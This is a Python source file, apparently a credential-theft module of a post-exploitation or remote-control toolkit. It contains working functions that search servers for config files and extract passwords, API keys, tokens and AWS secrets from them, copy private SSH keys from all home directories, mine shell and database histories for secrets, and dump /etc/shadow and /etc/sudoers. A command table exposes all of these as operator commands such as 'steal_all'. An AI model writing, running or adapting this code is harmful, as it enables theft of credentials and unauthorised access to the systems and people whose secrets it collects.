"""Credential and data theft module."""

import os
import re
import subprocess

NAME = "stealing"

PASSWORD_PATTERNS = [
    r'password\s*[=:]\s*["\']?([^\s"\']+)',
    r'passwd\s*[=:]\s*["\']?([^\s"\']+)',
    r'pass\s*[=:]\s*["\']?([^\s"\']+)',
    r'secret\s*[=:]\s*["\']?([^\s"\']+)',
    r'api[_-]?key\s*[=:]\s*["\']?([^\s"\']+)',
    r'token\s*[=:]\s*["\']?([^\s"\']+)',
    r'db_pass\s*[=:]\s*["\']?([^\s"\']+)',
    r'DATABASE_URL\s*[=:]\s*["\']?([^\s"\']+)',
    r'AWS_SECRET_ACCESS_KEY\s*[=:]\s*["\']?([^\s"\']+)',
]

CONFIG_PATHS = [
    ".env", ".env.local", ".env.production",
    "config.php", "wp-config.php", "settings.py", "config.py",
    "database.yml", "config.yml", "config.json",
    "web.config", "appsettings.json",
    ".git/config", ".gitconfig",
    ".my.cnf", ".pgpass", ".netrc",
    "credentials", "credentials.json", "service-account.json",
]


def _run(cmd: str) -> str:
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=30).decode(errors="replace").strip()
    except Exception:
        return ""


def cmd_steal_configs(path: str = "/") -> dict:
    found = []
    search_dirs = [
        "/var/www", "/opt", "/srv", "/home",
        "/etc", "/root", "/tmp",
    ]
    if path != "/":
        search_dirs = [path]

    for search_dir in search_dirs:
        for config_name in CONFIG_PATHS:
            results = _run(f"find {search_dir} -name '{config_name}' -readable -type f 2>/dev/null").splitlines()
            for fp in results:
                fp = fp.strip()
                if not fp:
                    continue
                try:
                    with open(fp, "r", errors="replace") as f:
                        content = f.read(10000)
                    creds = []
                    for pattern in PASSWORD_PATTERNS:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        creds.extend(matches)
                    if creds:
                        found.append({"file": fp, "credentials": list(set(creds))})
                except Exception:
                    pass
    return {"configs_with_creds": found, "count": len(found)}


def cmd_steal_ssh() -> dict:
    results = {"keys": [], "known_hosts": [], "configs": []}
    homes = ["/root"] + [f"/home/{d}" for d in os.listdir("/home")] if os.path.isdir("/home") else ["/root"]

    for home in homes:
        ssh_dir = os.path.join(home, ".ssh")
        if not os.path.isdir(ssh_dir):
            continue
        for f in os.listdir(ssh_dir):
            fp = os.path.join(ssh_dir, f)
            if not os.path.isfile(fp) or not os.access(fp, os.R_OK):
                continue
            try:
                with open(fp, "r", errors="replace") as fh:
                    content = fh.read()
                if "PRIVATE KEY" in content:
                    results["keys"].append({"path": fp, "content": content})
                elif f == "known_hosts":
                    results["known_hosts"].append({"path": fp, "entries": len(content.splitlines())})
                elif f == "config":
                    results["configs"].append({"path": fp, "content": content})
            except Exception:
                pass
    return results


def cmd_steal_history() -> dict:
    histories = {}
    history_files = [
        ".bash_history", ".zsh_history", ".sh_history",
        ".python_history", ".mysql_history", ".psql_history",
        ".node_repl_history", ".rediscli_history",
    ]
    homes = ["/root"] + [f"/home/{d}" for d in os.listdir("/home")] if os.path.isdir("/home") else ["/root"]

    for home in homes:
        for hf in history_files:
            fp = os.path.join(home, hf)
            if os.path.isfile(fp) and os.access(fp, os.R_OK):
                try:
                    with open(fp, "r", errors="replace") as f:
                        lines = f.readlines()
                    interesting = [l.strip() for l in lines if any(kw in l.lower() for kw in
                        ["pass", "secret", "key", "token", "curl", "wget", "ssh", "mysql", "psql", "sudo"])]
                    histories[fp] = {
                        "total_lines": len(lines),
                        "interesting": interesting[-100:],
                    }
                except Exception:
                    pass
    return {"histories": histories, "files_found": len(histories)}


def cmd_steal_passwords(path: str = "/", depth: int = 5) -> dict:
    found = []
    cmd = f"grep -rl --include='*.conf' --include='*.cfg' --include='*.ini' --include='*.xml' --include='*.yml' --include='*.yaml' --include='*.json' --include='*.env' --include='*.properties' --include='*.php' --include='*.py' -i 'password\\|passwd\\|secret\\|api_key' {path} -d {depth} 2>/dev/null | head -50"
    files = _run(cmd).splitlines()

    for fp in files:
        fp = fp.strip()
        if not fp:
            continue
        try:
            with open(fp, "r", errors="replace") as f:
                content = f.read(5000)
            creds = []
            for pattern in PASSWORD_PATTERNS:
                matches = re.findall(pattern, content, re.IGNORECASE)
                creds.extend(matches)
            if creds:
                found.append({"file": fp, "matches": list(set(creds))})
        except Exception:
            pass
    return {"files_with_passwords": found, "count": len(found)}


def cmd_steal_etc() -> dict:
    results = {}
    for f in ["/etc/passwd", "/etc/shadow", "/etc/group", "/etc/sudoers"]:
        try:
            with open(f, "r") as fh:
                results[f] = fh.read()
        except PermissionError:
            results[f] = "Permission denied"
        except FileNotFoundError:
            results[f] = "Not found"
    return results


def cmd_steal_all() -> dict:
    results = {}
    for name, func in [("configs", cmd_steal_configs), ("ssh", cmd_steal_ssh),
                        ("history", cmd_steal_history), ("etc", cmd_steal_etc)]:
        try:
            results[name] = func()
        except Exception as e:
            results[name] = {"error": str(e)}
    return results


COMMANDS = {
    "steal_all": {"handler": cmd_steal_all, "description": "Run all credential stealing modules"},
    "steal_configs": {"handler": cmd_steal_configs, "description": "Extract credentials from config files"},
    "steal_ssh": {"handler": cmd_steal_ssh, "description": "Steal SSH keys and configs"},
    "steal_history": {"handler": cmd_steal_history, "description": "Extract interesting command history"},
    "steal_passwords": {"handler": cmd_steal_passwords, "description": "Search files for passwords"},
    "steal_etc": {"handler": cmd_steal_etc, "description": "Dump /etc/passwd, shadow, group"},
}
